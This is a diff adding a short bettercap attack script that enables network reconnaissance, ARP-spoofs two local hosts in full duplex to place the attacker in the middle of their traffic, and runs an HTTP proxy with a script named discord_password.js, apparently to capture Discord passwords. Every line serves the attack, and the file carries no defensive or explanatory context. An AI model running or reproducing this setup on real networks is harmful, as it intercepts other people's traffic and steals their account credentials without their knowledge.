@@ -1,0 +1,9 @@
+set net.probe on
+net.recon on
+
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.2,192.168.1.3
+arp.spoof on
+
+set http.proxy.script ./discord_password.js
+http.proxy on
